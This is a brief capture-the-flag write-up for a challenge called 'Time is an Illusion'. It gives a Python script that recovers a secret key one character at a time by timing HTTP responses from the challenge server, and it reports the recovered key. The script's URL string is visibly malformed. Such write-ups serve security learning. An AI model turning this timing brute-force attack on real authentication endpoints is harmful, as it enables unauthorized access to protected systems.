# Time is an Illusion
```python
import requests
import string
t=[]
for i in string.printable:
  x = requests.get("https://time-is-an-illusion.vishwactf.com/handle.php?key=str(i)+"_____")
  t.append(x.elapsed.total_seconds())
  print(x.elapsed.total_seconds(),i)
print(max(t))

```
* Manully run the script for each charater in final we get the kye as `KuKa9`
